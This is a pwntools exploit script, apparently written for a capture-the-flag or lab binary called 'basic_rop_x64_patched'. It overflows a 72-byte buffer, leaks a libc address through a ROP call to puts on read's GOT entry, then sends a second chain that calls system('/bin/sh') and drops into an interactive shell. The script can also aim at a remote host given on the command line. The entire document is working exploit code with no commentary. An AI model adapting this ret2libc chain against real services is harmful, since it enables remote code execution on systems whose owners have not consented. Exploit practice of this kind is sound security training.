from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './basic_rop_x64_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
rop = ROP(elf)
libc = ELF('libc.so.6', checksec=False)
payload = b'a' * 72
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got['read'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
p.sendline(payload)
p.recv(72)
leak = u64(p.recvuntil(b'\n')[:6].ljust(8, b'\x00'))
#info leak
info('leak = ' + hex(leak))
libc.address = leak - libc.symbols['read']
info('libc.address = ' + hex(libc.address))
payload2 = b'a' * 72
payload2 += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload2 += p64(next(libc.search(b'/bin/sh\x00')))
payload2 += p64(libc.symbols['system'])
payload2 += p64(0xDEADBEEF)
p.sendline(payload2)
p.interactive()
